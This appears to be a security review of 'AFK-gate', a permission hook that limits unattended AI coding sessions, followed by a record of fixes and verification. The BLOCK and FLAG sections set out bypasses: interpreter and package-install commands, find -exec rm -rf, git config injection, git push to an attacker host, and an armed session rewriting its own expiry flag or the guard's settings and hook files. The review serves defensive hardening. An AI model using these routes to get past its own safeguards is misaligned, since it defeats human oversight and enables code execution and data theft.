# AFK-gate cross-model security review (post-build, spec `afk-permission-mode`)

Dispatched per the spec's `cross_model_review: true` frontmatter — Codex-built spec, reviewed by
Claude (Opus, security-domain routing). Verdict: **BLOCK**. Independently spot-verified two of the
three findings by the host directly (see below) — both confirmed real.

## BLOCK 1 — `isSafeAfkBash` allowlists general-purpose interpreters → arbitrary code execution
`hooks/lib/destructive-detect.js` `SAFE_AFK_COMMANDS` (lines 363-392) + `afk-gate.js` line 73.

The allowlist gates on command-head basename only. Interpreters/package managers on the list
execute arbitrary code from arguments/files that none of `isDestructiveBash` /
`isExfiltrationBash` / `isRemoteCodeExec` catch — and `stripQuotedStrings` removes quoted payload
content *before* those detectors run. Confirmed auto-`allow` (armed) PoCs:
- `node -e "<anything>"` / `python -c "..."` / `py -c "..."` — arbitrary code execution.
- `npx <evil-package>` — remote code fetch+exec.
- `npm install <evil>` / `pip install <evil>` — arbitrary `postinstall`/`setup.py` execution
  (exactly the "install/poison deps" case the design claims to block).
- `find . -exec rm -rf {} +` — `+` isn't a segment separator, head is `find` not `rm`, so
  `isDestructiveRm` never fires. Arbitrary deletion.
- `awk 'BEGIN{system("<cmd>")}'` — quoted body stripped before detection; head `awk` safe.
- `git -c core.fsmonitor=<exe> status` — `findGitSubcommand` skips `-c`'s value, lands on
  `status`; not flagged as destructive git. Git-config-mediated code execution.

## BLOCK 2 — Bash arm-write guard misses the real absolute flag path (host-verified)
`isAfkTarget` (destructive-detect.js line 337-339) only matches `~/.claude/afk.on` or
`$home/.claude/afk.on` — NOT the literal path `C:\Users\User\.claude\afk.on` that `afk-gate.js`
itself uses (line 22). Host-verified directly:
```
isAfkFlagWrite('echo t > ~/.claude/afk.on')                        -> true
isAfkFlagWrite('echo t > C:\Users\User\.claude\afk.on')             -> false
```
The always-`ask` arm guard never fires for the absolute-path form. Worse: while armed, that same
command passes `isSafeAfkBash` (head `echo`) and gets an outright `allow` — an armed session can
silently rewrite/extend its own `expires=` indefinitely, defeating the stated runaway control.

## BLOCK 3 — The guard's own config/hook files are not critical paths (host-verified)
`isCriticalPath` (afk-gate.js lines 127-146) checks for `auth`/`guard` substrings, manifests,
credential dotfiles, etc. — but `C:\Users\User\.claude\settings.json`, `afk-gate.js`, and
`destructive-detect.js` itself match none of these patterns. Host-verified by hand-tracing the
predicate against all three paths — none match. An armed session can `Write` to `settings.json`
(remove the hooks) or `afk-gate.js`/`destructive-detect.js` (neuter detection) and get `allow`,
persistently disabling the entire guard.

## FLAG (medium) — `git push` to an arbitrary remote is an uncaught exfil channel
`isExfiltrationBash` only inspects `curl/wget/iwr/irm/Invoke-*` heads; `git push
https://attacker/r HEAD:x` (no `--force`, no `main`/`master` target) passes `isDestructiveGit` and
is auto-allowed while armed — an uncaught exfil path for the whole repo.

## FLAG (low) — `MultiEdit` bypasses the arm-write guard
`afk-gate.js` matches `toolName === 'Edit'` exactly; the settings.json matcher regex `Write|Edit`
also fires for `MultiEdit` (substring match) but the hook's own exact-match misses it, so a
`MultiEdit` targeting `afk.on` skips the always-`ask` guard.

## FLAG (medium) — JS/PowerShell critical-path duplication is a drift hazard
`afk-gate.js isCriticalPath` and `backend-pretool-write.ps1 Test-AfkCriticalPath` are hand-ported
twins, currently equivalent but with no shared source or parity test — a future addition to one
can silently miss the other.

## CLEAN (confirmed holding)
`Test-AfkArmed` fail-closed parsing (incl. the DateTimeStyles fix), `afk-gate.js isArmed`,
flag-absent no-op, `destructive-command-guard.js` behavior-preservation, `settings.json` validity,
`apex-afk/SKILL.md` (never instructs arming).

## Why the green Task 6 matrix didn't catch this
Every Task 6 probe (`rm -rf`, `curl -X POST -d @.env`, `curl|bash`) is a command the detectors
were explicitly written to catch. None of the probes exercised the interpreter-bypass class
(`node -e`, `npx`, `pip install`, `find -exec`, `awk system`), the absolute-path arm-write, or the
self-config write. A green matrix is consistent with all three BLOCKs being present.

## RESOLVED — all 3 BLOCKs fixed and live-verified (same session)

Fixes applied to `hooks/lib/destructive-detect.js` (+ `afk-gate.js` delegation,
`backend-pretool-write.ps1` parity):

1. **BLOCK 1**: `SAFE_AFK_COMMANDS` narrowed — removed `node`, `python`, `py`, `npx`, `npm`,
   `pnpm`, `yarn`, `uv`, `uvx`, `pip`, `pytest`, `tsc`, `eslint`, `ruff`, `mypy`, `cargo`, `go`,
   `codex`, `claude` (all execute arbitrary code from arguments/lifecycle-scripts in ways no
   destructive/exfil/RCE detector can safely allowlist by command head alone). Kept `find` and
   `git` but added targeted argument-level guards: `find` denies `-exec`/`-execdir`/`-ok`/
   `-okdir`/`-delete`/`-fprintf`; `git` denies `-c`/`--config-env` (config injection) in addition
   to the existing `isDestructiveGit` checks — both preserve everyday safe usage (`find -name`,
   `git status`/`add`/`commit`) while closing the RCE vector. Removing `codex`/`claude` has no
   practical impact — `Bash(codex exec:*)` is already unconditionally pre-authorized in
   `settings.json`'s static `permissions.allow`, independent of AFK.
2. **BLOCK 2**: `isAfkTarget` now also matches the real absolute path (`C:\Users\User\.claude\
   afk.on`), not just the `~`/`$home` forms. Also fixed a related bug found while verifying this:
   the redirect-detection regex inside `isAfkFlagWrite` still only recognized the tilde form even
   after `isAfkTarget` was extended — broadened to fire on any redirect once `isAfkTarget` already
   matched.
3. **BLOCK 3**: added `isCriticalPath` to the shared lib (exported, with self-config protection:
   `~/.claude/hooks/**` and `~/.claude/settings.json`) and unified `afk-gate.js`'s own critical-path
   check to delegate to it (single source of truth for the JS side). Also closed a related gap
   found while designing this fix: `isSafeAfkBash` now checks `cp`/`mv`/`Copy-Item`/`Move-Item`/
   `New-Item` destination arguments and `sed -i` targets against `isCriticalPath` too — the
   original Write/Edit-only critical-path check didn't cover Bash-based file copies, which could
   otherwise overwrite the guard's own files just as easily as a Write tool call.
   `backend-pretool-write.ps1`'s `Test-AfkCriticalPath` twin updated to match (defensive parity,
   though its own `claudeRoot` exemption means this branch is currently unreachable there).

**Comprehensive isolated verification**: 30/30 checks pass (original acceptance matrix + all
3 BLOCK fixes + regression checks for legitimate `git`/`find` usage) — see
`verify-full-matrix.js` results, run directly against the shared detection module.

**Final live-armed verification** (direct stdin piping to the real `afk-gate.js`, real armed flag,
test-only 5-min expiry): `node -e` → empty (no longer allowed) · `npm install` → empty ·
`Write settings.json` → empty · `cp → settings.json` → empty · absolute-path arm-write → `ask` ·
`taskkill` (regression) → `allow` · normal `Write` (regression) → `allow`. All 7/7 match
expectations exactly. Real `afk.on` flag confirmed absent before and after.

**Status: all 3 BLOCKs closed, spec unblocked.** The Specialist Context's original claim ("a
forged arm can neither wipe, exfiltrate, RCE, install/poison deps, nor touch critical files") now
holds as built and verified, not just asserted.
